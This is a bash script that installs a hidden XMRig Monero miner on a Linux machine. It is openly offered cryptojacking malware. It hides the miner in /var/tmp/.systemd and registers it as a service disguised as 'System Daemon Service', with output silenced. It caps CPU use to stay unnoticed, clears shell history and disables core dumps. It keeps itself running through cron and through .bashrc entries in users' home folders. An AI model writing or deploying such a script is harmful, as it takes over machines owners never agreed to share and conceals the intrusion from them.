#!/bin/bash

WALLET_ADDRESS="42KJm7TrQHJNA4r6qSkzidb7eRVs1YzGx2sFJzNZnLdghVWjdWt9UE2d6Egpmt1m6nYMoJUnnhbxoQ4P5H6NyScd3a2hB3n"		#change this address
POOL_ADDRESS="pool.supportxmr.com:443"

if [ "$(id -u)" -ne 0 ]; then
  echo "This script must be run as root"
  exit 1
fi

apt-get update > /dev/null 2>&1


apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev wget curl > /dev/null 2>&1

mkdir -p /var/tmp/.systemd
cd /var/tmp/.systemd

ARCH=$(uname -m)
if [ "$ARCH" = "x86_64" ]; then
  wget -O xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz > /dev/null 2>&1
  tar -xzf xmrig.tar.gz > /dev/null 2>&1
  mv xmrig-6.21.0 xmrig
  rm -f xmrig.tar.gz
else

  git clone https://github.com/xmrig/xmrig.git > /dev/null 2>&1
  cd xmrig
  mkdir build
  cd build
  cmake .. > /dev/null 2>&1
  make -j$(nproc) > /dev/null 2>&1
  cd /var/tmp/.systemd
  mv xmrig/build xmrig
fi

chmod +x /var/tmp/.systemd/xmrig/xmrig

cat > /etc/systemd/system/systemd.service << EOF
[Unit]
Description=System Daemon Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/var/tmp/.systemd/xmrig
ExecStart=/var/tmp/.systemd/xmrig/xmrig -o $POOL_ADDRESS -u $WALLET_ADDRESS -k --donate-level=1 --max-cpu-usage=50 --threads=2 --tls --rig-id=$(hostname)
Restart=always
RestartSec=30
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable systemd.service
systemctl start systemd.service


cd /root
rm -rf /var/tmp/.systemd/xmrig/.git
rm -rf /var/tmp/.systemd/xmrig/src
rm -rf /var/tmp/.systemd/xmrig/scripts
rm -rf /var/tmp/.systemd/xmrig/tests
history -c
history -w


echo "kernel.core_pattern = |/bin/false" >> /etc/sysctl.conf
sysctl -w kernel.core_pattern=/bin/null > /dev/null 2>&1


(crontab -l 2>/dev/null; echo "*/5 * * * * pgrep -f xmrig > /dev/null || systemctl start systemd.service") | crontab -


echo "systemctl start systemd.service" >> /root/.bashrc
echo "systemctl start systemd.service" >> /home/*/.bashrc 2>/dev/null

echo "Installation completed successfully"
